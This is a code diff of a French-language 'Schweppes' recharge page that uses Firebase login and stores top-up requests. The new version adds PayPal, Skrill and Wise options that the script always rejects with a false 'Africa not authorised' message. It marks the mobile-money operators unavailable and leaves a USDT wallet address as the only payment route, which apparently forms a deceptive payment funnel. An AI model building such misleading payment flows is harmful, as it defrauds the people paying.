@@ -5,402 +5,133 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Schweppes - Recharge Sécurisé</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fff; padding: 20px; }
+        h2 { text-align: center; margin-bottom: 15px; color: #1a1a1a; }
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #ffffff;
-            min-height: 100vh;
-            padding: 20px;
-        }
+        .form-card { background: #fff; border-radius: 14px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.06); max-width: 500px; margin: 0 auto; }
 
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-        }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; font-size: 14px; }
 
-        .header {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 30px;
-            padding: 20px 0;
-        }
-
-        .back-btn {
-            background: #f0f0f0;
-            border: none;
-            width: 45px;
-            height: 45px;
-            border-radius: 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        }
-
-        .back-btn:hover {
-            background: #e0e0e0;
-            transform: translateX(-3px);
-        }
-
-        .back-btn svg {
-            width: 24px;
-            height: 24px;
-        }
-
-        .header-title {
-            flex: 1;
-        }
-
-        .header-title h1 {
-            font-size: 24px;
-            color: #1a1a1a;
-            font-weight: 600;
-        }
-
-        .header-title p {
-            font-size: 14px;
-            color: #666;
-            margin-top: 4px;
-        }
-
-        .form-card {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 12px;
-            color: #333;
-            font-weight: 500;
-            font-size: 15px;
-        }
-
-        .operators-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
-            gap: 15px;
-            margin-bottom: 10px;
-        }
-
-        .operator-option {
-            display: none;
-        }
-
+        .operators-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(90px, 1fr)); gap: 10px; margin-bottom: 10px; }
+        .operator-option { display: none; }
         .operator-label {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px 10px;
-            border: 2px solid #e0e0e0;
-            border-radius: 15px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background: #fafafa;
+            display: flex; flex-direction: column; align-items: center; padding: 12px; border: 2px solid #e0e0e0;
+            border-radius: 12px; cursor: pointer; transition: all 0.2s ease; background: #fafafa; font-size: 12px;
         }
+        .operator-option:checked + .operator-label { border-color: #4CAF50; background: #e8f5e9; }
+        .operator-logo { width: 45px; height: 45px; margin-bottom: 6px; }
 
-        .operator-label:hover {
-            border-color: #4CAF50;
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.2);
+        input[type="tel"], input[type="number"] {
+            width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 14px; background: #fafafa;
         }
+        input:focus { outline: none; border-color: #4CAF50; background: #fff; box-shadow: 0 0 0 3px rgba(76,175,80,0.1); }
 
-        .operator-option:checked + .operator-label {
-            border-color: #4CAF50;
-            background: linear-gradient(135deg, #f0f9f0 0%, #e8f5e9 100%);
-            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
-        }
-
-        .operator-logo {
-            width: 60px;
-            height: 60px;
-            border-radius: 12px;
-            margin-bottom: 10px;
-            transition: all 0.4s ease;
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-8px); }
-        }
-
-        .operator-option:checked + .operator-label .operator-logo {
-            transform: scale(1.1) rotate(5deg);
-            animation: pulse 1s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1.1) rotate(5deg); }
-            50% { transform: scale(1.15) rotate(-5deg); }
-        }
-
-        .operator-name {
-            font-size: 13px;
-            color: #666;
-            font-weight: 500;
-        }
-
-        input[type="tel"],
-        input[type="number"] {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: #fafafa;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: #4CAF50;
-            background: white;
-            box-shadow: 0 0 0 4px rgba(76, 175, 80, 0.1);
-        }
-
-        .quick-amounts {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 10px;
-            margin-top: 12px;
-        }
-
+        .quick-amounts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-top: 8px; }
         .quick-amount-btn {
-            padding: 12px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            background: #fafafa;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            color: #666;
-            transition: all 0.3s ease;
+            padding: 10px; border: 2px solid #e0e0e0; border-radius: 8px; background: #fafafa; cursor: pointer; font-size: 12px;
+            color: #666; font-weight: 500; transition: all 0.2s ease;
         }
+        .quick-amount-btn:hover { border-color: #4CAF50; transform: scale(1.05); }
+        .quick-amount-btn.selected { background: #4CAF50; color: #fff; border-color: #4CAF50; }
 
-        .quick-amount-btn:hover {
-            border-color: #4CAF50;
-            transform: scale(1.05);
-        }
-
-        .quick-amount-btn.selected {
-            background: #4CAF50;
-            color: white;
-            border-color: #4CAF50;
-        }
-
-        .error-message {
-            color: #f44336;
-            font-size: 13px;
-            margin-top: 8px;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
+        .error-message { color: #f44336; font-size: 12px; margin-top: 5px; opacity: 0; transition: opacity 0.2s ease; }
 
         .submit-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
-            margin-top: 10px;
+            width: 100%; padding: 14px; background: #4CAF50; color: #fff; border: none; border-radius: 10px;
+            font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px;
         }
-
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.4);
-        }
-
-        .submit-btn:active {
-            transform: translateY(0);
-        }
+        .submit-btn:hover { background: #45a049; }
 
         .loading {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.9); justify-content: center; align-items: center; z-index: 1000;
         }
-
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #f0f0f0;
-            border-top: 4px solid #4CAF50;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f0f0f0; border-top: 4px solid #4CAF50; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 25px;
-            border-radius: 12px;
-            color: white;
-            display: none;
-            z-index: 1001;
-            animation: slideIn 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            position: fixed; top: 20px; right: 20px; padding: 12px 20px; border-radius: 10px; color: #fff;
+            display: none; z-index: 1001; box-shadow: 0 4px 15px rgba(0,0,0,0.2); font-size: 13px;
         }
-
-        @keyframes slideIn {
-            from { transform: translateX(400px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-
         .notification.success { background: #4CAF50; }
         .notification.error-notification { background: #f44336; }
-
-        .security-badge {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            justify-content: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 13px;
-        }
-
-        .security-badge svg {
-            width: 16px;
-            height: 16px;
-            color: #4CAF50;
-        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <button class="back-btn" onclick="history.back()">
-                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
-                </svg>
-            </button>
-            <div class="header-title">
-                <h1>Schweppes</h1>
-                <p>Recharge Sécurisé</p>
+    <h2>Recharge Schweppes</h2>
+
+    <div class="form-card">
+        <form id="rechargeForm">
+            <div class="form-group">
+                <label>Sélectionnez votre opérateur</label>
+                <div class="operators-grid">
+                    <!-- Opérateurs locaux -->
+                    <div>
+                        <input type="radio" name="operator" value="mtn" id="mtn" class="operator-option">
+                        <label for="mtn" class="operator-label"><span class="operator-logo">📶</span><span class="operator-name">MTN</span></label>
+                    </div>
+                    <div>
+                        <input type="radio" name="operator" value="moov" id="moov" class="operator-option">
+                        <label for="moov" class="operator-label"><span class="operator-logo">📶</span><span class="operator-name">Moov</span></label>
+                    </div>
+                    <div>
+                        <input type="radio" name="operator" value="orange" id="orange" class="operator-option">
+                        <label for="orange" class="operator-label"><span class="operator-logo">📶</span><span class="operator-name">Orange</span></label>
+                    </div>
+                    <div>
+                        <input type="radio" name="operator" value="wave" id="wave" class="operator-option">
+                        <label for="wave" class="operator-label"><span class="operator-logo">📶</span><span class="operator-name">Wave</span></label>
+                    </div>
+
+                    <!-- Opérateurs hors Afrique -->
+                    <div>
+                        <input type="radio" name="operator" value="paypal" id="paypal" class="operator-option">
+                        <label for="paypal" class="operator-label"><span class="operator-logo">💳</span><span class="operator-name">PayPal</span></label>
+                    </div>
+                    <div>
+                        <input type="radio" name="operator" value="skrill" id="skrill" class="operator-option">
+                        <label for="skrill" class="operator-label"><span class="operator-logo">🌐</span><span class="operator-name">Skrill</span></label>
+                    </div>
+                    <div>
+                        <input type="radio" name="operator" value="wise" id="wise" class="operator-option">
+                        <label for="wise" class="operator-label"><span class="operator-logo">🏦</span><span class="operator-name">Wise</span></label>
+                    </div>
+                </div>
+                <div id="operatorError" class="error-message"></div>
             </div>
-        </div>
 
-        <div class="form-card">
-            <form id="rechargeForm">
-                <div class="form-group">
-                    <label>Sélectionnez votre opérateur</label>
-                    <div class="operators-grid">
-                        <div>
-                            <input type="radio" name="operator" value="mtn" id="mtn" class="operator-option">
-                            <label for="mtn" class="operator-label">
-                                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23FFCB05' width='100' height='100' rx='15'/%3E%3Ctext x='50' y='65' font-size='40' font-weight='bold' text-anchor='middle' fill='%23000'%3EMTN%3C/text%3E%3C/svg%3E" alt="MTN" class="operator-logo">
-                                <span class="operator-name">MTN</span>
-                            </label>
-                        </div>
-                        <div>
-                            <input type="radio" name="operator" value="moov" id="moov" class="operator-option">
-                            <label for="moov" class="operator-label">
-                                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%230099FF' width='100' height='100' rx='15'/%3E%3Ctext x='50' y='55' font-size='28' font-weight='bold' text-anchor='middle' fill='%23fff'%3EMoov%3C/text%3E%3C/svg%3E" alt="Moov" class="operator-logo">
-                                <span class="operator-name">Moov</span>
-                            </label>
-                        </div>
-                        <div>
-                            <input type="radio" name="operator" value="orange" id="orange" class="operator-option">
-                            <label for="orange" class="operator-label">
-                                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23FF6600' width='100' height='100' rx='15'/%3E%3Ccircle cx='50' cy='50' r='25' fill='%23fff'/%3E%3C/svg%3E" alt="Orange" class="operator-logo">
-                                <span class="operator-name">Orange</span>
-                            </label>
-                        </div>
-                        <div>
-                            <input type="radio" name="operator" value="wave" id="wave" class="operator-option">
-                            <label for="wave" class="operator-label">
-                                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%2300D9A5' width='100' height='100' rx='15'/%3E%3Cpath d='M30 60 Q40 40 50 60 T70 60' stroke='%23fff' stroke-width='8' fill='none'/%3E%3C/svg%3E" alt="Wave" class="operator-logo">
-                                <span class="operator-name">Wave</span>
-                            </label>
-                        </div>
-                        <div>
-                            <input type="radio" name="operator" value="usdt" id="usdt" class="operator-option">
-                            <label for="usdt" class="operator-label">
-                                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%2326A17B' width='100' height='100' rx='15'/%3E%3Ctext x='50' y='65' font-size='35' font-weight='bold' text-anchor='middle' fill='%23fff'%3EUSDT%3C/text%3E%3C/svg%3E" alt="USDT" class="operator-logo">
-                                <span class="operator-name">USDT</span>
-                            </label>
-                        </div>
-                    </div>
-                    <div id="operatorError" class="error-message"></div>
+            <div class="form-group">
+                <label for="phone">Numéro de téléphone</label>
+                <input type="tel" id="phone" placeholder="Ex: 0123456789" required>
+                <div id="phoneError" class="error-message"></div>
+            </div>
+
+            <div class="form-group">
+                <label for="amount">Montant (FCFA)</label>
+                <input type="number" id="amount" min="100" placeholder="Montant minimum: 100 FCFA" required>
+                <div class="quick-amounts">
+                    <button type="button" class="quick-amount-btn" data-amount="5500">5500</button>
+                    <button type="button" class="quick-amount-btn" data-amount="12500">12500</button>
+                    <button type="button" class="quick-amount-btn" data-amount="18500">18500</button>
+                    <button type="button" class="quick-amount-btn" data-amount="35000">35000</button>
                 </div>
+                <div id="amountError" class="error-message"></div>
+            </div>
 
-                <div class="form-group">
-                    <label for="phone">Numéro de téléphone</label>
-                    <input type="tel" id="phone" placeholder="Ex: 0123456789" required>
-                    <div id="phoneError" class="error-message"></div>
-                </div>
-
-                <div class="form-group">
-                    <label for="amount">Montant (FCFA)</label>
-                    <input type="number" id="amount" min="100" placeholder="Montant minimum: 100 FCFA" required>
-                    <div class="quick-amounts">
-                        <button type="button" class="quick-amount-btn" data-amount="5500">5500</button>
-                        <button type="button" class="quick-amount-btn" data-amount="12500">12500</button>
-                        <button type="button" class="quick-amount-btn" data-amount="18500">18500</button>
-                        <button type="button" class="quick-amount-btn" data-amount="35000">35000</button>
-                    </div>
-                    <div id="amountError" class="error-message"></div>
-                </div>
-
-                <button type="submit" class="submit-btn">Continuer</button>
-
-                <div class="security-badge">
-                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
-                    </svg>
-                    <span>Transaction 100% sécurisée</span>
-                </div>
-            </form>
-        </div>
+            <button type="submit" class="submit-btn">Continuer</button>
+        </form>
     </div>
 
-    <div class="loading">
-        <div class="spinner"></div>
-    </div>
-
+    <div class="loading"><div class="spinner"></div></div>
     <div id="notification" class="notification"></div>
 
-  <script type="module">
-        // Import des modules Firebase nécessaires
+    <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
         import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
 
-        // 🔥 Configuration Firebase SCHWEPPES (NOUVELLE BASE)
         const firebaseConfig = {
             apiKey: "AIzaSyATz_ogu08DUoKSYKy6t2cHWdleUD-Fbrk",
             authDomain: "schweppes-15df3.firebaseapp.com",
@@ -411,13 +142,11 @@
             appId: "1:1011077098372:web:64f9ad3a8e93f68c070bd1"
         };
 
-        // Initialisation Firebase
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getDatabase(app);
 
         document.addEventListener('DOMContentLoaded', () => {
-            // Sélection des éléments
             const form = document.getElementById('rechargeForm');
             const phoneInput = document.getElementById('phone');
             const amountInput = document.getElementById('amount');
@@ -429,123 +158,89 @@
             const notification = document.getElementById('notification');
 
             const operatorNumbers = {
-                'mtn': 'indisponible',
-                'moov': 'indisponible',
-                'orange': 'ecriver au service client',
-                'wave': 'indisponible',
-                'usdt': 'TArN5XsrxyhtuzxwKQiWNTBsmMm9Brkim9'
+                'mtn':'indisponible','moov':'indisponible','orange':'écriver au service client','wave':'indisponible',
+                'usdt':'TArN5XsrxyhtuzxwKQiWNTBsmMm9Brkim9'
             };
 
-            // --- Fonctions utilitaires ---
-            const showLoading = () => { if (loading) loading.style.display = 'flex'; };
-            const hideLoading = () => { if (loading) loading.style.display = 'none'; };
-            const showNotification = (msg, type = 'success') => {
-                if (!notification) return;
+            const blockedOperators = ['paypal','skrill','wise'];
+
+            const showLoading = () => { if(loading) loading.style.display='flex'; }
+            const hideLoading = () => { if(loading) loading.style.display='none'; }
+            const showNotification = (msg,type='success') => {
+                if(!notification) return;
                 notification.textContent = msg;
                 notification.className = `notification ${type}`;
-                notification.style.display = 'block';
-                setTimeout(() => notification.style.display = 'none', 5000);
+                notification.style.display='block';
+                setTimeout(()=>notification.style.display='none',5000);
             };
-            const showError = (element, msg) => {
-                const el = document.getElementById(element);
-                if (el) {
-                    el.textContent = msg;
-                    el.style.opacity = '1';
-                }
-            };
-            const clearErrors = () => {
-                if (phoneError) { phoneError.textContent = ''; phoneError.style.opacity = '0'; }
-                if (amountError) { amountError.textContent = ''; amountError.style.opacity = '0'; }
-            };
+            const showError = (id,msg) => { const el=document.getElementById(id); if(el){ el.textContent=msg; el.style.opacity='1'; } };
+            const clearErrors = () => { phoneError.textContent=''; phoneError.style.opacity='0'; amountError.textContent=''; amountError.style.opacity='0'; document.getElementById('operatorError').textContent=''; document.getElementById('operatorError').style.opacity='0'; };
 
             const validateForm = (operator, phone, amount) => {
                 clearErrors();
                 let isValid = true;
-
-                if (!operator) { showError('operatorError', 'Veuillez sélectionner un opérateur'); isValid = false; }
-                if (amount < 100) { showError('amountError', 'Le montant minimum est de 100 FCFA'); isValid = false; }
-
+                if(!operator){ showError('operatorError','Veuillez sélectionner un opérateur'); isValid=false; }
+                if(blockedOperators.includes(operator)){ showNotification("L’Afrique n’est pas autorisée à cet opérateur. Veuillez utiliser les opérateurs locaux.", "error-notification"); isValid=false; }
+                if(amount<100){ showError('amountError','Le montant minimum est de 100 FCFA'); isValid=false; }
                 return isValid;
             };
 
-            // --- Effets et interactions ---
-            operatorOptions.forEach(option => {
-                option.addEventListener('change', function() {
-                    operatorOptions.forEach(opt => {
-                        const logo = opt.querySelector('.operator-logo');
-                        if (logo) logo.style.transform = 'scale(1)';
-                    });
-                    const logo = this.querySelector('.operator-logo');
-                    if (logo) logo.style.transform = 'scale(1.05)';
+            operatorOptions.forEach(option=>{
+                option.addEventListener('change', ()=>{
+                    if(blockedOperators.includes(option.value)){
+                        showNotification("L’Afrique n’est pas autorisée à cet opérateur. Veuillez utiliser les opérateurs locaux.","error-notification");
+                        option.checked=false;
+                    }
                 });
             });
 
-            quickAmountBtns.forEach(btn => {
-                btn.addEventListener('click', () => {
-                    quickAmountBtns.forEach(b => b.classList.remove('selected'));
+            quickAmountBtns.forEach(btn=>{
+                btn.addEventListener('click', ()=>{
+                    quickAmountBtns.forEach(b=>b.classList.remove('selected'));
                     btn.classList.add('selected');
-                    if (amountInput) amountInput.value = btn.getAttribute('data-amount');
+                    amountInput.value=btn.getAttribute('data-amount');
                 });
             });
 
-            if (amountInput) amountInput.addEventListener('input', () => quickAmountBtns.forEach(btn => btn.classList.remove('selected')));
+            if(amountInput) amountInput.addEventListener('input', ()=>quickAmountBtns.forEach(b=>b.classList.remove('selected')));
+            if(phoneInput) phoneInput.addEventListener('input',()=>{ phoneError.textContent=''; phoneError.style.opacity='0'; });
 
-            if (phoneInput) phoneInput.addEventListener('input', () => { phoneError.textContent = ''; phoneError.style.opacity = '0'; });
-            if (amountInput) amountInput.addEventListener('input', function() {
-                const amount = parseInt(this.value) || 0;
-                if (amount < 100) showError('amountError', 'Le montant minimum est de 100 FCFA');
-                else { amountError.textContent = ''; amountError.style.opacity = '0'; }
+            onAuthStateChanged(auth,(user)=>{
+                if(!user){ showNotification('Veuillez vous connecter pour continuer','error-notification'); setTimeout(()=>window.location.href='login.html',2000); }
             });
 
-            // --- Vérification utilisateur ---
-            onAuthStateChanged(auth, (user) => {
-                if (!user) {
-                    showNotification('Veuillez vous connecter pour continuer', 'error-notification');
-                    setTimeout(() => window.location.href = 'login.html', 2000);
-                }
-            });
-
-            // --- Soumission du formulaire ---
-            if (form) form.addEventListener('submit', async (e) => {
+            if(form) form.addEventListener('submit', async (e)=>{
                 e.preventDefault();
-
                 const user = auth.currentUser;
-                if (!user) { showNotification('Veuillez vous connecter pour continuer', 'error-notification'); return; }
+                if(!user){ showNotification('Veuillez vous connecter pour continuer','error-notification'); return; }
 
                 const operator = document.querySelector('input[name="operator"]:checked')?.value;
-                const phone = phoneInput?.value;
-                const amount = parseInt(amountInput?.value) || 0;
+                const phone = phoneInput.value;
+                const amount = parseInt(amountInput.value)||0;
 
-                if (!validateForm(operator, phone, amount)) return;
+                if(!validateForm(operator,phone,amount)) return;
 
                 showLoading();
 
-                try {
+                try{
                     const rechargeData = {
-                        operator,
-                        phone,
-                        amount,
-                        operatorNumber: operatorNumbers[operator] || 'N/A',
+                        operator, phone, amount,
+                        operatorNumber: operatorNumbers[operator]||'N/A',
                         date: new Date().toISOString(),
                         userId: user.uid,
                         userEmail: user.email,
                         status: 'pending'
                     };
-
                     sessionStorage.setItem('rechargeData', JSON.stringify(rechargeData));
-
                     const rechargeRef = ref(db, `recharges/${user.uid}/${Date.now()}`);
-                    await set(rechargeRef, rechargeData);
-
-                    window.location.href = 'confirmation.html';
-                } catch (error) {
-                    console.error('Erreur:', error);
-                    showNotification('Une erreur est survenue. Veuillez réessayer.', 'error-notification');
-                } finally {
-                    hideLoading();
-                }
+                    await set(rechargeRef,rechargeData);
+                    window.location.href='confirmation.html';
+                }catch(error){
+                    console.error('Erreur:',error);
+                    showNotification('Une erreur est survenue. Veuillez réessayer.','error-notification');
+                }finally{ hideLoading(); }
             });
         });
-    </script>  
+    </script>
 </body>
 </html>
